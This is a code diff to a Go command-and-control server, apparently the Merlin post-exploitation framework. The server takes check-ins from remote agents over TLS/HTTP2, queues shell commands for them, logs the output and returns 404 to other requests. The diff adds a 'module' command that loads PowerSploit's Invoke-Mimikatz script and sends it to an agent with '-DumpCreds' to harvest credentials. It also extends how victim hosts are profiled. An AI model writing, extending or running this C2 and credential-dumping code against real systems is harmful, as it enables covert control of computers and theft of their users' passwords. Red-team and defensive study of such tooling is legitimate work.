@@ -5,7 +5,7 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	"log"
+	//"log"
 	"net/http"
 	"os"
 	"time"
@@ -23,11 +23,12 @@ import (
 	//"crypto/x509"
 	//"text/template/parse"
 	"strconv"
+	"io/ioutil"
 )
 
 //Global Variables
 var DEBUG = false
-var VERBOSE = true
+var VERBOSE = false
 var src = rand.NewSource(time.Now().UnixNano())
 const merlinVersion = "0.1 Beta"
 const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -66,7 +67,21 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 		color.Yellow("[-]Recieved HTTP %s Connection from %s", r.Method, r.Host)
 	}
 
-	if r.Method == "POST" {
+	if DEBUG {
+		color.Red("\n[DEBUG]HTTP Connection Details:")
+		color.Red("[DEBUG]Host: %s", r.Host)
+		color.Red("[DEBUG]URI: %s", r.RequestURI)
+		color.Red("[DEBUG]Method: %s", r.Method)
+		color.Red("[DEBUG]Protocol: %s", r.Proto)
+		color.Red("[DEBUG]Headers: %s", r.Header)
+		color.Red("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol)
+		color.Red("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite)
+		color.Red("[DEBUG]TLS Server Name: %s", r.TLS.ServerName)
+		color.Red("[DEBUG]Content Length: %d", r.ContentLength)
+	}
+
+	if r.Method == "POST" && r.ProtoMajor == 2 {
+
 		var payload json.RawMessage
 		j := messages.Base{
 			Payload: &payload,
@@ -83,15 +98,30 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 			agentInitialCheckIn(j, p)
 		case "StatusCheckIn":
 			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(statusCheckIn(j))
-		case "PSResults":
+			x := statusCheckIn(j)
+			if VERBOSE {
+				color.Green(x.Type)
+			}
+			json.NewEncoder(w).Encode(x)
+		case "CmdResults":
 			//TODO move to its own function
-			var p messages.PSResults
+			var p messages.CmdResults
 			json.Unmarshal(payload, &p)
 			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results for job: %s\r\n",time.Now(), p.Job))
-			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results:\r\n%s\r\n",time.Now(), p.Result))
-			color.Green("[+]Results for job %s", p.Job)
-			color.Green("%s", p.Result)
+
+			color.Blue("[+]Results for job %s", p.Job)
+			if len(p.Stdout) > 0{
+				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stdout):\r\n%s\r\n",
+					time.Now(),
+					p.Stdout))
+				color.Green("%s", p.Stdout)
+			}
+			if len(p.Stderr) > 0{
+				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stderr):\r\n%s\r\n",
+					time.Now(),
+					p.Stderr))
+				color.Red("%s", p.Stderr)
+			}
 			fmt.Printf("merlin>")
 		default:
 			color.Red("[!]Invalid Activity: %s", j.Type)
@@ -99,9 +129,14 @@ func httpHandler(w http.ResponseWriter, r *http.Request) {
 		}
 
 	} else if r.Method == "GET" {
-		g := messages.Base{ID: uuid.NewV4(), Type: "TEST"}
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(g)
+		//Should answer any GET requests
+		//g := messages.Base{ID: uuid.NewV4(), Type: "TEST"}
+		//w.Header().Set("Content-Type", "application/json")
+		//json.NewEncoder(w).Encode(g)
+		//Send 404
+		w.WriteHeader(404)
+	} else {
+		w.WriteHeader(404)
 	}
 }
 
@@ -137,7 +172,14 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 	//Configure TLS
 	config := &tls.Config{
 		Certificates: []tls.Certificate{cer},
-		//NextProtos: []string{"h2"},
+		MinVersion: tls.VersionTLS12,
+		CipherSuites: []uint16{
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+
+			},
+		NextProtos: []string{"h2"},
 	}
 	http.HandleFunc(webpath, httpHandler)
 
@@ -153,7 +195,13 @@ func startListener(port string, ip string, crt string, key string, webpath strin
 	//I shouldn't need to specify the certs as they are in the config
 	color.Yellow("[-]HTTPS Listener Started on %s:%s", ip, port)
 	fmt.Printf("merlin>")
-	go log.Fatal(s.ListenAndServeTLS(crt, key))
+	err2 := s.ListenAndServeTLS(crt, key)
+	if err2 != nil {
+		color.Red("[!]There was an error with the web server")
+		fmt.Println(err2)
+		fmt.Printf("merlin>")
+		return
+	}
 	// TODO determine scripts path and load certs by their absolute path
 }
 
@@ -163,6 +211,8 @@ func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
 		color.Yellow("\t[i]Host ID: %s", j.ID)
 		color.Yellow("\t[i]Activity: %s", j.Type)
 		color.Yellow("\t[i]Payload: %s", j.Payload)
+		color.Yellow("\t[i]Platform: %s", p.Platform)
+		color.Yellow("\t[i]Architecture: %s", p.Architecture)
 		color.Yellow("\t[i]Username: %s", p.UserName)
 	}
 	agentsDir := filepath.Join(currentDir, "agents")
@@ -184,11 +234,14 @@ func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
     		panic(err)
 	}
 	// Add custom agent struct to global agents map
-	agents[j.ID]=&agent{id: j.ID, userName: p.UserName, userGUID: p.UserGUID,
+	agents[j.ID]=&agent{id: j.ID, userName: p.UserName, userGUID: p.UserGUID, platform: p.Platform,
+		           architecture: p.Architecture,
 		           hostName: p.HostName, pid: p.Pid, channel: make(chan []string, 10),
 		           agentLog: f, iCheckIn: time.Now(), sCheckIn: time.Now()}
 
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent initial check in for agent %s\r\n",time.Now(), j.ID))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), p.Platform))
+	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Architecture: %s\r\n", time.Now(), p.Architecture))
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), p.HostName))
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), p.UserName))
 	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
@@ -203,6 +256,7 @@ func statusCheckIn(j messages.Base) messages.Base {
 		color.Green("[+]Recieved agent status checkin from %s", j.ID)
 	}
 	if DEBUG{
+		color.Red("[DEBUG]Recieved agent status checkin from %s", j.ID)
 		color.Red("[DEBUG]Channel length: %d", len(agents[j.ID].channel))
 		color.Red("[DEBUG]Channel content: %s", agents[j.ID].channel)
 	}
@@ -222,11 +276,20 @@ func statusCheckIn(j messages.Base) messages.Base {
 		switch command[0]{
 		case "agent_cmd":
 			p := messages.CmdPayload{
-			Command: strings.Join(command[2:], " "),
+			Command: command[2],
 			Job: jobID,
 			}
+			if len(command) > 3 {
+				p.Args = strings.Join(command[3:], " ")
+			}
 
-			k, _ := json.Marshal(p)
+			k, err := json.Marshal(p)
+
+			if err != nil {
+				color.Red("There was an error marshaling the JSON object")
+				color.Red(err.Error())
+			}
+
 			g := messages.Base{
 				Version: 1.0,
 				ID:      j.ID,
@@ -235,6 +298,7 @@ func statusCheckIn(j messages.Base) messages.Base {
 			}
 
 			return g
+
 		case "agent_control":
 			p := messages.AgentControl{
 			Command: command[2],
@@ -290,16 +354,37 @@ func shell() {
 		cmd := strings.Split(stripped_cmd, " ")
 
 		switch cmd[0] {
+		case "":
+		case "module":
+			//f, err :=ioutil.ReadFile("C:\\Users\\Russe\\Desktop\\hw.ps1")
+			f, err :=ioutil.ReadFile("C:\\Data\\Dev\\Ne0nd0g\\Merlin\\data\\src\\PowerShell\\PowerSploit\\Exfiltration\\Invoke-Mimikatz.ps1")
+			if err != nil {
+				color.Red("There was an error reading the file")
+				color.Red(err.Error())
+			}
+
+			a, _ := uuid.FromString(cmd[1])
+			cmd[0] = "agent_cmd"
+			cmd = append(cmd, "test")
+			t := "($s=" + string(f) + ");Invoke-Mimikatz -DumpCreds"
+			cmd[2] = t
+			s := agents[a].channel
+			s <- cmd
+
 		case "exit":
 			color.Red("[!]Quitting")
-			os.Exit(1)
+			os.Exit(0)
+
 		case "quit":
 			color.Red("[!]Quitting")
-			os.Exit(1)
+			os.Exit(0)
+
 		case "?":
 			usage()
+
 		case "help":
 			usage()
+
 		case "agent_control":
 			if len(cmd) == 3 {
 				a, _ := uuid.FromString(cmd[1])
@@ -309,29 +394,36 @@ func shell() {
 				color.Red("[!]Invalid command")
 				color.White("agent_control <agent ID> <command>")
 			}
+
 		case "agent_cmd":
 			if len(cmd) >= 3 {
 				a, _ := uuid.FromString(cmd[1])
 				s := agents[a].channel //https://github.com/golang/go/issues/3117
 				s <- cmd
-				a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[1]))
+				a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[2]))
 				if DEBUG {
-					color.Red("Input: %s", cmd[1])
-					color.Red("Base64 Input: %s", a_cmd)
+					color.Red("[DEBUG]Input: %s", cmd[2])
+					color.Red("[DEBUG]Base64 Input: %s", a_cmd)
 				}
 			}else {
 				color.Red("[!]Invalid command")
 				color.White("agent_cmd <agent ID> <cmd>")
 			}
+
 		case "agent_list":
-			color.Yellow("====================================================")
-			color.Yellow("\t\tAgents List")
-			color.Yellow("====================================================")
-			color.Yellow("GUID\t\t\t\t\tUser\t\t\tHost")
-			color.Yellow("====================================================")
+			color.Yellow("====================================================" +
+				"====================================================")
+			color.Yellow("\t\t\t\t\tAgents List")
+			color.Yellow("====================================================" +
+				"====================================================")
+			color.Yellow("GUID\t\t\t\t\tPlatform\t\tUser\t\t\tHost")
+			color.Yellow("====================================================" +
+				"====================================================")
 			for k, v := range agents{
-				color.Yellow("%s\t%s\t%s", k.String(), v.userName, v.hostName)
+				color.Yellow("%s\t%s/%s\t\t%s\t\t%s", k.String(), v.platform, v.architecture,
+					v.userName, v.hostName)
 			}
+
 		case "agent_info":
 			if len(cmd) == 1 {
 				color.Red("[!]Invalid command")
@@ -339,13 +431,16 @@ func shell() {
 			} else if len(cmd) >= 2 {
 				a, _ := uuid.FromString(cmd[1])
 				color.Yellow("ID : %s", agents[a].id.String())
+				color.Yellow("Platform: %s", agents[a].platform)
+				color.Yellow("Architecture: %s", agents[a].architecture)
 				color.Yellow("UserName : %s", agents[a].userName)
 				color.Yellow("User GUID : %s", agents[a].userGUID)
 				color.Yellow("Hostname : %s", agents[a].hostName)
 				color.Yellow("Process ID : %d", agents[a].pid)
-				color.Yellow("Initial Check In: %s", agents[a].iCheckIn.String())
-				color.Yellow("Last Check In: %s", agents[a].sCheckIn.String())
+				color.Yellow("Initial Check In: \t%s", agents[a].iCheckIn.String())
+				color.Yellow("Last Check In: \t%s", agents[a].sCheckIn.String())
 			}
+
 		default:
 			color.Red("[!]Invalid command: %s", cmd)
 		}
@@ -373,6 +468,8 @@ func RandStringBytesMaskImprSrc(n int) string {
 
 type agent struct {
 	id		uuid.UUID
+	platform	string
+	architecture	string
 	userName	string
 	userGUID	string
 	hostName 	string
